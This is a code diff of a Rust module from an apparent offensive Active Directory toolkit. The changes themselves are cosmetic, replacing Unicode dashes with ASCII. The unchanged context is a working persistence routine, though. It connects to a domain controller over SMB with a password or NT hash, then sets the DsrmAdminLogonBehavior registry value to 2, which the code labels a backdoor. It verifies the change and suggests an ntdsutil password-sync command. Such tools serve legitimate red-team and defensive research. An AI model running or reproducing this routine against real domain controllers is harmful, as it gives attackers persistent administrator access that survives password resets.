@@ -2,7 +2,7 @@
 //!
 //! Sets `DsrmAdminLogonBehavior=2` on the DC's registry via a remote
 //! service, allowing the local DSRM Administrator account to authenticate
-//! over the network — providing persistent admin access even if all domain
+//! over the network -- providing persistent admin access even if all domain
 //! passwords are changed.
 //!
 //! # Execution Flow
@@ -18,9 +18,9 @@
 //!
 //! | Value | Meaning |
 //! |-------|---------|
-//! | 0     | Default – DSRM admin can only log on in DSRM boot mode |
+//! | 0     | Default -- DSRM admin can only log on in DSRM boot mode |
 //! | 1     | DSRM admin can log on if AD DS service is stopped |
-//! | 2     | **BACKDOOR** – DSRM admin can ALWAYS log on over the network |
+//! | 2     | **BACKDOOR** -- DSRM admin can ALWAYS log on over the network |
 
 use overthrone_core::error::{OverthroneError, Result};
 use overthrone_core::proto::smb::SmbSession;
@@ -39,7 +39,7 @@ const DSRM_REG_VALUE: &str = "DsrmAdminLogonBehavior";
 pub async fn enable_dsrm_backdoor(config: &ForgeConfig) -> Result<ForgeResult> {
     info!("[dsrm] Enabling DSRM backdoor on {}", config.dc_ip);
 
-    // ── Input validation ────────────────────────────────────────
+    // -- Input validation ----------------------------------------
     if config.dc_ip.trim().is_empty() {
         return Err(OverthroneError::TicketForge(
             "DC IP address cannot be empty for DSRM backdoor".into(),
@@ -56,7 +56,7 @@ pub async fn enable_dsrm_backdoor(config: &ForgeConfig) -> Result<ForgeResult> {
         ));
     }
 
-    // ── Validate credentials ────────────────────────────────────
+    // -- Validate credentials ------------------------------------
     let (use_password, password_or_hash) = match (&config.password, &config.nt_hash) {
         (Some(pw), _) => (true, pw.clone()),
         (None, Some(hash)) => (false, hash.clone()),
@@ -67,7 +67,7 @@ pub async fn enable_dsrm_backdoor(config: &ForgeConfig) -> Result<ForgeResult> {
         }
     };
 
-    // ── Step 1: Connect to DC via SMB ───────────────────────────
+    // -- Step 1: Connect to DC via SMB ---------------------------
     info!("[dsrm] Connecting to {} via SMB", config.dc_ip);
     let smb = if use_password {
         SmbSession::connect(
@@ -94,7 +94,7 @@ pub async fn enable_dsrm_backdoor(config: &ForgeConfig) -> Result<ForgeResult> {
         })?
     };
 
-    // ── Step 2: Verify admin access ─────────────────────────────
+    // -- Step 2: Verify admin access -----------------------------
     info!("[dsrm] Verifying admin access on {}", config.dc_ip);
     let admin_check = smb.check_admin_access().await;
     if !admin_check.has_admin {
@@ -108,7 +108,7 @@ pub async fn enable_dsrm_backdoor(config: &ForgeConfig) -> Result<ForgeResult> {
         admin_check.accessible_shares
     );
 
-    // ── Step 3: Set DsrmAdminLogonBehavior = 2 ──────────────────
+    // -- Step 3: Set DsrmAdminLogonBehavior = 2 ------------------
     let reg_command = format!(
         "reg add \"{}\" /v {} /t REG_DWORD /d 2 /f",
         DSRM_REG_PATH, DSRM_REG_VALUE
@@ -124,7 +124,7 @@ pub async fn enable_dsrm_backdoor(config: &ForgeConfig) -> Result<ForgeResult> {
             ))
         })?;
 
-    // Check output — successful reg add prints "The operation completed successfully."
+    // Check output -- successful reg add prints "The operation completed successfully."
     let reg_success = reg_output.contains("successfully")
         || reg_output.contains("Successfully")
         || reg_output.trim().is_empty(); // empty output is also ok for reg add
@@ -138,7 +138,7 @@ pub async fn enable_dsrm_backdoor(config: &ForgeConfig) -> Result<ForgeResult> {
         info!("[dsrm] Registry value set successfully");
     }
 
-    // ── Step 4: Verify the value was set ────────────────────────
+    // -- Step 4: Verify the value was set ------------------------
     let verify_cmd = format!("reg query \"{}\" /v {}", DSRM_REG_PATH, DSRM_REG_VALUE);
     info!("[dsrm] Verifying: {}", verify_cmd);
 
@@ -163,9 +163,9 @@ pub async fn enable_dsrm_backdoor(config: &ForgeConfig) -> Result<ForgeResult> {
         );
     }
 
-    // ── Step 5: (Optional) Sync DSRM password ──────────────────
+    // -- Step 5: (Optional) Sync DSRM password ------------------
     // ntdsutil "set dsrm password" "sync from domain account Administrator" q q
-    // This step is informational — executing ntdsutil interactively over svcctl
+    // This step is informational -- executing ntdsutil interactively over svcctl
     // is unreliable. Users should run it manually or via WinRM.
     let sync_note = format!(
         "To sync DSRM password to a known account, run on DC:\n\
@@ -173,7 +173,7 @@ pub async fn enable_dsrm_backdoor(config: &ForgeConfig) -> Result<ForgeResult> {
         config.username
     );
 
-    // ── Build result ────────────────────────────────────────────
+    // -- Build result --------------------------------------------
     let cleanup_cmd = format!(
         "# Remove DSRM backdoor:\n\
          reg delete \"{}\" /v {} /f",
@@ -219,12 +219,12 @@ pub async fn enable_dsrm_backdoor(config: &ForgeConfig) -> Result<ForgeResult> {
         }),
         message: if success {
             format!(
-                "DSRM backdoor enabled on {} — DsrmAdminLogonBehavior=2",
+                "DSRM backdoor enabled on {} -- DsrmAdminLogonBehavior=2",
                 config.dc_ip
             )
         } else {
             format!(
-                "DSRM backdoor may have failed on {} — check output",
+                "DSRM backdoor may have failed on {} -- check output",
                 config.dc_ip
             )
         },
